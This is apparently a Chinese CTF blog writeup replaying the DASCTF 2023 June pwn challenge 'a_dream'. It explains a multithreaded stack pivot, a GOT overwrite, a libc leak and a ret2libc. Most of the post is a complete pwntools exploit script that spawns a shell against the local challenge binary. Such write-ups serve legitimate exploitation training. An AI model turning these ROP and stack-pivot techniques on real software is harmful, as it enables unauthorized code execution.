---

title: 「PWN」【DASCTF2023 二进制专场 六月】Writeup WP 复现

tags: ['CTF', 'Pwn', 'writeup', 'wp']

authors: [nova]
---

这次 PWN 赛题挺高质量的，但是题量太大了加上准备考试所以没咋做，浅浅复现一下

<!--truncate-->

## a_dream

多线程的栈迁移题目。

要点：

- 主线程在子线程创建后开的沙箱不影响子线程
- 子线程的栈由 mmap 开辟，与 libc 偏移相同
- 子线程与父线程使用同一个 GOT / PLT 表

攻击思路：

1. 栈迁移到 bss 上，将 write 的 GOT 表改为父线程里的 read
2. 利用 puts 泄露 libc，进而获得子线程栈地址
3. ret2libc

注意的点：

- 修改完 write 的 GOT 表之后，其实也只能溢出 0x10，但是此时 `rbp - 0x10` 的地方正好是 read 函数 ret 的地方，因此我们可以做到 0x20 字节的控制，正好够写 `pop rdi + got['puts'] + plt['puts'] + magic_read`
- 此时 magic_read 仍然只能溢出 0x10，但是我们已经由 libc 地址获得了子线程的栈地址，所以往栈的高位迁移即可。

疑惑的点：

- ~~修改完 write 的 GOT 表后，由于每 1s 都会运行一次 write，也就是都在等待 stdin 的输入，此时不知道 pwndbg 的问题还是因为一直在被中断，反正只能断在那，不能 si/n/c，都会炸掉，因此调试起来非常复杂，甚至于后面是靠不断修改断点位置来进行单步（笑~~

  设置 gdb `set scheduler-locking step`即可

![image-20230623124315352](https://cdn.ova.moe/img/image-20230623124315352.png)

exp（不适用于远程，本地 2.35 的 libc）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch = 'amd64', os = 'linux')
context.log_level = 'debug'
context.terminal='wt.exe bash -c'.split(' ')

sh = process("./pwn_9")
elf = ELF("./pwn_9")
# libc = ELF("./libc.so.6")

def dbg(cmd: str = '', pause_time: int = 3) -> None:
    gdb.attach(sh, cmd)
    if pause_time == 0:
        pause()
    else:
        pause(pause_time)

bss = elf.bss() + 0x100
magic_read = 0x4013AE
pop_rdi_ret = 0x401483
pop_rsi_r15_ret = 0x401481
leave_ret = 0x4013C5

success('bss: ' + hex(bss))
payload = b'a'*0x40 + p64(bss+0x40) + p64(magic_read)
sh.send(payload)

payload = p64(pop_rsi_r15_ret) + p64(elf.got['write']) + p64(0) + p64(elf.plt['read'])
payload += p64(pop_rdi_ret) + p64(1000) + p64(elf.plt['sleep'])
payload = payload.ljust(0x40, b'\x00') + p64(bss-0x8) + p64(leave_ret)
sh.send(payload)
# dbg(f't 2\nb *0x4013c5')
payload = p64(magic_read)
sleep(0.2)
sh.send(payload)
sleep(0.2)
sh.send(b'a'*0x30 + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(magic_read))

libc = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x80ed0
str_bin_sh = libc + 0x1d8698
system_addr = libc + 0x50d60
stack = libc - 0x11b0 - 0x40
success('libc: ' + hex(libc))

payload = p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)
payload = payload.ljust(0x40, b'\x00') + p64(stack - 8) + p64(leave_ret)
sh.send(payload)
sh.interactive()
```

